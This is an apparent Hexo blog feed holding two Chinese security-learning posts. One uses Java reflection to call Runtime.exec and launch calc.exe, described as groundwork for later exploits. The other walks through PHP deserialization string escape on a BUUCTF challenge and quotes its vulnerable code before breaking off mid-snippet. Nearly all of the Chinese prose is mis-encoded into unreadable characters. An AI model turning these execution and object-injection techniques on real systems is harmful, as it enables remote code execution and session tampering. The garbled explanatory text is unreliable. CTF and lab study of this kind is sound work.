    <content type="html"><![CDATA[<h1 id="æ·±åº¦ç†è§£åå°„"><a href="#æ·±åº¦ç†è§£åå°„" class="headerlink" title="æ·±åº¦ç†è§£åå°„"></a>æ·±åº¦ç†è§£åå°„</h1><h2 id="åŒºåˆ«ç±»çš„åˆå§‹åŒ–å’Œç±»çš„å®ä¾‹åŒ–"><a href="#åŒºåˆ«ç±»çš„åˆå§‹åŒ–å’Œç±»çš„å®ä¾‹åŒ–" class="headerlink" title="åŒºåˆ«ç±»çš„åˆå§‹åŒ–å’Œç±»çš„å®ä¾‹åŒ–"></a>åŒºåˆ«ç±»çš„åˆå§‹åŒ–å’Œç±»çš„å®ä¾‹åŒ–</h2><h3 id="ç±»çš„åˆå§‹åŒ–"><a href="#ç±»çš„åˆå§‹åŒ–" class="headerlink" title="ç±»çš„åˆå§‹åŒ–"></a>ç±»çš„åˆå§‹åŒ–</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;è¿™é‡Œæ˜¯åˆå§‹å—&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;è¿™é‡Œæ˜¯é™æ€åˆå§‹å—&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Demo1</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;è¿™é‡Œæ˜¯æ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RealizeDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class.forName(<span class="hljs-string">&quot;xsw6a.Demo1&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271507364.png"></p><p>è¿™é‡Œä»…ä»…åªæ˜¯æ‰§è¡Œäº†é™æ€åˆå§‹ã€‚å³å½“ç±»åŠ è½½è¿›äº†å†…å­˜ï¼Œåªæœ‰<strong>é™æ€åˆå§‹å—</strong>å¾—åˆ°äº†æ‰§è¡Œã€‚</p><h3 id="ç±»çš„å®ä¾‹åŒ–"><a href="#ç±»çš„å®ä¾‹åŒ–" class="headerlink" title="ç±»çš„å®ä¾‹åŒ–"></a>ç±»çš„å®ä¾‹åŒ–</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RealizeDemo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo1</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271509598.png" alt="QQæˆªå›¾20220227150956"></p><p>æ‰§è¡Œé¡ºåºã€‚</p><h2 id="åˆ©ç”¨åå°„å¼¹å‡ºè®¡ç®—å™¨ï¼ˆåç»­æ¼æ´åŸºæœ¬éƒ½è¦ç”¨åˆ°ï¼‰"><a href="#åˆ©ç”¨åå°„å¼¹å‡ºè®¡ç®—å™¨ï¼ˆåç»­æ¼æ´åŸºæœ¬éƒ½è¦ç”¨åˆ°ï¼‰" class="headerlink" title="åˆ©ç”¨åå°„å¼¹å‡ºè®¡ç®—å™¨ï¼ˆåç»­æ¼æ´åŸºæœ¬éƒ½è¦ç”¨åˆ°ï¼‰"></a>åˆ©ç”¨åå°„å¼¹å‡ºè®¡ç®—å™¨ï¼ˆåç»­æ¼æ´åŸºæœ¬éƒ½è¦ç”¨åˆ°ï¼‰</h2><h3 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h3><p>è·å–æŸç±»ä¸­çš„æ–¹æ³•ï¼šClass.forName(â€œjava.lang.Runtimeâ€).getMethod(â€œexecâ€, String.class)</p><p>è·å–Runtimeç±»ä¸‹çš„execæ–¹æ³•ã€‚</p><h3 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h3><p>**invoke(ç±»å¯¹è±¡ï¼Œexecæ–¹æ³•ä¼ å…¥çš„å‚æ•°)**ï¼Œè¿™é‡Œçš„ç±»å¯¹è±¡å¿…é¡»æ˜¯å·²ç»å®ä¾‹åŒ–çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> clazz.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        method.invoke(m,<span class="hljs-string">&quot;clac.exe&quot;</span>);<span class="hljs-comment">//è°ƒç”¨å®ä¾‹åŒ–å¯¹è±¡å¹¶ä¸”ä¼ å…¥å‚æ•°</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œäº§ç”Ÿäº†æŠ¥é”™ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271536031.png" alt="QQæˆªå›¾20220227153541"></p><p>ç§ç±»æ„é€ å‡½æ•°æ— æ³•ç›´æ¥è¿›è¡Œ<code>newInstance()</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271537610.png" alt="QQæˆªå›¾20220227153650"></p><h3 id="éæš´åŠ›"><a href="#éæš´åŠ›" class="headerlink" title="éæš´åŠ›"></a>éæš´åŠ›</h3><p><strong>è¿™é‡ŒRuntimeç±»å¯ä»¥é€šè¿‡getRuntimeæ–¹æ³•è¿”å›ä¸€ä¸ªå¯¹è±¡ã€‚</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        method.invoke(clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271556483.png" alt="QQæˆªå›¾20220227155543"></p><h3 id="æš´åŠ›"><a href="#æš´åŠ›" class="headerlink" title="æš´åŠ›"></a>æš´åŠ›</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructors</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>        declaredConstructors.setAccessible(<span class="hljs-literal">true</span>);<br>        clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(declaredConstructors.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271611004.png" alt="QQæˆªå›¾20220227161118"></p><p>é‡è¦çš„æ˜¯å¼€å¯<code>.setAccessible(true);</code></p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPååºåˆ—åŒ–ä¹‹å­—ç¬¦ä¸²é€ƒé€¸ï¼ˆå˜çŸ­ï¼‰</title>
    <link href="/2022/02/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%EF%BC%88%E5%8F%98%E7%9F%AD%EF%BC%89/"/>
    <url>/2022/02/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%EF%BC%88%E5%8F%98%E7%9F%AD%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="PHPååºåˆ—åŒ–ä¹‹å­—ç¬¦é€ƒé€¸ï¼ˆå˜çŸ­ï¼‰"><a href="#PHPååºåˆ—åŒ–ä¹‹å­—ç¬¦é€ƒé€¸ï¼ˆå˜çŸ­ï¼‰" class="headerlink" title="PHPååºåˆ—åŒ–ä¹‹å­—ç¬¦é€ƒé€¸ï¼ˆå˜çŸ­ï¼‰"></a>PHPååºåˆ—åŒ–ä¹‹å­—ç¬¦é€ƒé€¸ï¼ˆå˜çŸ­ï¼‰</h1><p>ä»Šå¤©åšbuuctfä¸Šå¾—é¢˜æ—¶å€™ï¼Œå°±æ¥å­¦ä¹ ä¸€ä¸‹ã€‚æœå¯»èµ„æ–™æ­¤ç±»é¢˜å‹æœ‰ä¸¤ç§æ–¹æ³•ã€‚</p><h2 id="æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿"><a href="#æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿" class="headerlink" title="æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿"></a>æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿</h2><p>ç›®å‰è¿˜æ²¡æœ‰ç¢°åˆ°ã€‚</p><h2 id="æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²è¾¹çŸ­"><a href="#æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²è¾¹çŸ­" class="headerlink" title="æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²è¾¹çŸ­"></a>æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²è¾¹çŸ­</h2><p>ç®€å•è¯´ä¸€ä¸‹ã€‚(å¦‚æœä¸æ‡‚phpååºåˆ—åŒ–å°±åˆ«å¾€ä¸‹çœ‹äº†)<br>é¦–å…ˆæˆ‘ä»¬è¦äº†è§£phpååºåˆ—åŒ–åå¾—å­—ç¬¦ä¸²<strong>ï¼šPHPåœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ—¶ä»¥<code>;</code>ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥<code>&#125;</code>ä½œä¸ºç»“å°¾ï¼ˆå­—ç¬¦ä¸²é™¤å¤–ï¼‰ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„</strong></p><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;phpflag&#x27;</span> =&gt; <span class="hljs-string">&#x27;;s:5:&quot;xsw6a&quot;;s:2:&quot;zx&quot;;s:1:&quot;1&quot;;&#125;&#x27;</span>,<br>    <span class="hljs-string">&#x27;cuit&#x27;</span> =&gt; <span class="hljs-string">&#x27;stop water and stop power college&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456601.png" alt="QQæˆªå›¾20220227142612"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpflag&quot;</span>;s:<span class="hljs-number">31</span>:<span class="hljs-string">&quot;;s:5:&quot;</span>xsw6a<span class="hljs-string">&quot;;s:2:&quot;</span>zx<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;&#125;&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;cuit&quot;</span>;s:<span class="hljs-number">33</span>:<span class="hljs-string">&quot;stop water and stop power college&quot;</span>;&#125;&quot;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆä»€ä¹ˆå«å­—ç¬¦ä¸²é€ƒé€¸å‘¢ï¼Ÿ</p><p><strong>é¦–å…ˆç¬¬ä¸€ç‚¹ï¼Œåœ¨åç»­çš„åˆ©ç”¨è¿‡ç¨‹ä¸­åªä¼šåˆ©ç”¨è¿™ä¸€æ®µã€‚</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpflag&quot;</span>;s:<span class="hljs-number">31</span>:<span class="hljs-string">&quot;;s:5:&quot;</span>xsw6a<span class="hljs-string">&quot;;s:2:&quot;</span>zx<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>å‡å¦‚è¿™é‡Œæ·»åŠ ä¸€å±‚è¿‡æ»¤ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$filter_arr</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<span class="hljs-comment">//è¿™å˜æˆäº†ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼äº†å“¦</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$img</span>);<span class="hljs-comment">//çœ‹ä¸€ä¸‹imgé‡Œé¢æœ‰æ²¡æœ‰filterçš„ä¸œè¥¿ï¼Œæœ‰çš„è¯ï¼Œæ¢æˆç©ºæ ¼</span><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;phpflag&#x27;</span> =&gt; <span class="hljs-string">&#x27;;s:5:&quot;xsw6a&quot;;s:2:&quot;zx&quot;;s:1:&quot;1&quot;;&#125;&#x27;</span>,<br>    <span class="hljs-string">&#x27;cuit&#x27;</span> =&gt; <span class="hljs-string">&#x27;stop water and stop power college&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">filter</span>((<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>))));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271432213.png" alt="QQæˆªå›¾20220227143230"></p><p>æ¸…æ¥šå¯è§è¿™é‡Œå¾—<code>phpflag</code>è¢«è¿‡æ»¤æ›¿æ¢ä¸ºç©ºã€‚è¿™é‡Œå®é™…çš„å¯¹åº”å€¼å¦‚ä¸‹ã€‚</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">s<span class="hljs-number"> 7 </span>;s:31: <span class="hljs-comment">#ç¬¬ä¸€ä¸ª</span><br>s<span class="hljs-number"> 5 </span>xsw6a  <span class="hljs-comment">#ç¬¬äºŒä¸ª</span><br>s<span class="hljs-number"> 2 </span>zx     <span class="hljs-comment">#ç¬¬ä¸‰ä¸ª</span><br>s<span class="hljs-number"> 1 </span>1      <span class="hljs-comment">#ç¬¬å››ä¸ª</span><br></code></pre></td></tr></table></figure><h3 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456805.png" alt="QQæˆªå›¾20220227143810"></h3><p>è¯»ä»£ç ã€‚<br>ä¾æ¬¡åˆ†æã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿‡æ»¤è€Œå·²ã€‚</p><p><strong>è¡¥å……</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456400.png" alt="QQæˆªå›¾20220227144023"></p><p>å¦‚æœé”®ååŒ…å«æ•°å­—å¥½åƒè¿™é‡Œç»•ä¸è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>é”€æ¯sessionã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br></code></pre></td></tr></table></figure><p>é‡æ–°ä¼ å…¥å‚æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ç®€å•ç†è§£æ¥è¯´ï¼Œå°±æ˜¯å¯ä»¥ç›´æ¥è¦†ç›–ä¸Šé¢çš„sessionå€¼ã€‚æœ¬åœ°å®éªŒå¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271445397.png" alt="QQæˆªå›¾20220227144500"></p><p>è®°ä½è¿™ä¸€ç‚¹å¾ˆå…³é”®ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯åˆ©ç”¨åˆ°ä¸Šé¢å°†çš„ï¼š<strong>PHPåœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ—¶ä»¥<code>;</code>ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥<code>&#125;</code>ä½œä¸ºç»“å°¾ï¼ˆå­—ç¬¦ä¸²é™¤å¤–ï¼‰ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span 